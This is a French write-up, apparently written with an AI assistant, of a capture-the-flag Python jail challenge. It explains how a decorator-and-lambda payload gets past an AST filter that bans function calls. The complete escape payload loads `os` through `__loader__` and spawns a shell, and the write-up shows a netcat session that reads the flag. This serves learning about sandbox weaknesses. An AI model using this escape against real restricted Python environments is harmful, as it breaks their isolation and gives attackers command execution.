# Write-Up : Challenge Python Jail "AST"

## 1. Description du Challenge

Le challenge nous donne accès à une instance Python via `nc`. L'objectif est de lire le fichier `flag.txt`. Cependant, le code soumis passe par un validateur d'**AST** (Abstract Syntax Tree) très restrictif.
fichier lié : ![main.py](main.py)

### Les Contraintes :

* **Charset restreint :** Seules les minuscules sont autorisées. Toute majuscule (comme dans `BuiltinImporter`) déclenche une erreur `error:charset BI`.
* **Interdiction de `ast.Call` :** Il est strictement impossible d'utiliser des parenthèses `()` pour appeler des fonctions ou instancier des classes.
* **Environnement vide :** Les `__builtins__` classiques sont supprimés. Seul l'objet `__loader__` (alias de `_frozen_importlib.BuiltinImporter`) est fourni dans le scope global.

---

## 2. Analyse de la Vulnérabilité

### Le Bypass de `ast.Call` via les Décorateurs

Puisque nous ne pouvons pas appeler de fonctions directement, nous utilisons la syntaxe des **décorateurs** (`@`). En Python, appliquer un décorateur est une opération interne qui appelle la fonction décoratrice avec l'objet décoré comme argument, sans nécessiter de parenthèses explicites.

### La Flexibilité de Python 3.9+

Depuis la version 3.9, la grammaire de Python autorise des expressions complexes après le symbole `@`. Cela nous permet d'utiliser des **lambdas** pour transformer nos données au milieu de la chaîne d'appel.

### Introspection pour les chaînes de caractères

Le `BuiltinImporter` (via `load_module`) attend une chaîne de caractères (le nom du module). Sans guillemets ni fonction `str()`, nous utilisons l'attribut `__name__` des fonctions définies via `def`.

---

## 3. Construction du Payload

Le payload se construit en deux étapes majeures.

### Étape 1 : Chargement du module `os`

Nous utilisons un décorateur imbriqué. La fonction `os` est passée à une lambda qui extrait son nom (`"os"`), puis ce nom est passé à `__loader__.load_module`.

```Python
@__loader__.load_module     # 2. Reçoit la chaîne "os" et charge le module
@(lambda x: x.__name__)     # 1. Reçoit l'objet fonction 'os' -> renvoie "os"
def os(): 1
```

### Étape 2 : Exécution de la commande

Une fois le module `os` chargé et stocké dans la variable `os`, nous accédons à `os.system`. Nous utilisons la même technique pour lui passer la commande `"sh"`.

```Python
@os.system                  # 2. Exécute os.system("sh")
@(lambda x: x.__name__)     # 1. Reçoit l'objet fonction 'sh' -> renvoie "sh"
def sh(): 1
```

---

## 4. Exploitation Finale

En combinant les deux étapes et en terminant par le mot-clé `end` (requis par le script du challenge), nous obtenons un shell :

```Python
@__loader__.load_module
@(lambda x: x.__name__)
def os(): 1

@os.system
@(lambda x: x.__name__)
def sh(): 1
end
```

### Exécution sur la cible :

```bash
$ nc challenges.ctf.sd 34397
# [Envoi du payload]
sh: can't access tty; job control turned off
~ $ ls
flag.txt  main.py
~ $ cat flag.txt
0xL4ugh{1_t0ld_y0u_N0_m3rcyyyyyy_e746a09146883a38}

```

---

## 5. Conclusion

Ce challenge démontre que même avec un filtrage AST sévère, la flexibilité syntaxique de Python (notamment les décorateurs et l'introspection) permet de reconstruire des appels de fonctions arbitraires. La clé résidait ici dans l'utilisation de `__loader__` pour sortir de l'environnement restreint.

---

**Souhaites-tu que je t'explique comment on aurait pu faire si `__loader__` n'avait pas été disponible dans les globales ?**

